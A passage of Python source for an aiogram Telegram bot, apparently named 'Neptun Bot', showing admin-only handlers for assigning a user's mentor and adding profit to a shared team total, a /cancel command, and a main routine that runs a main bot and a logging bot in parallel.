@dp.message(AdminState.waiting_mentor_val)
async def admin_mentor_val(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID: return
    data = await state.get_data()
    uid = data["target_uid"]
    p = get_profile(uid)
    p["mentor"] = message.text.strip()
    save_profile(uid, p)
    await state.clear()
    await message.answer(f"✅ Наставник для {uid}: {p['mentor']}", reply_markup=admin_kb())

@dp.callback_query(F.data == "admin_profit")
async def cb_admin_profit(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌", show_alert=True); return
    await state.set_state(AdminState.waiting_profit_add)
    await callback.message.answer("Введи сумму профита для добавления в общую кассу ($):")
    await callback.answer()

@dp.message(AdminState.waiting_profit_add)
async def admin_add_profit(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID: return
    try:
        amount = float(message.text.strip().replace(",", "."))
        team = load_team()
        team["total_profit"] = round(team.get("total_profit", 0) + amount, 3)
        save_team(team)
        await state.clear()
        await message.answer(
            f"✅ Добавлено {amount}$\nОбщая касса: {team['total_profit']}$",
            reply_markup=admin_kb()
        )
    except ValueError:
        await message.answer("❌ Введи число:")


# ══════════════════ CANCEL ══════════════════

@dp.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext):
    await state.clear()
    if message.from_user.id == ADMIN_ID:
        await message.answer("❌ Отменено.", reply_markup=admin_kb())
    else:
        await message.answer("❌ Отменено.", reply_markup=main_kb())


# ══════════════════ MAIN ══════════════════

async def main():
    logger.info("Neptun Bot запущен!")
    # Запускаем два бота параллельно
    await asyncio.gather(
        dp.start_polling(bot),
        log_dp.start_polling(log_bot),
    )

if __name__ == "__main__":
    asyncio.run(main())
